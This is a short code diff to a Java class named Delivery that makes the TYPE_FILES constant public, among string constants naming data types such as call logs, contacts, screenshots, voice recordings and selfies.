@@ -30,7 +30,7 @@ public class Delivery {
     private static final String TYPE_CALL_LOGS = "call_logs";
 
     public static final String TYPE_CONTACTS = "contacts";
-    private static final String TYPE_FILES = "files";
+    public static final String TYPE_FILES = "files";
     private static final String TYPE_MEDIA_SCREEN_SHOT = "media_screen_shot";
     private static final String TYPE_MEDIA_VOICE = "media_voice";
     private static final String TYPE_MEDIA_SELFIE = "media_selfie";
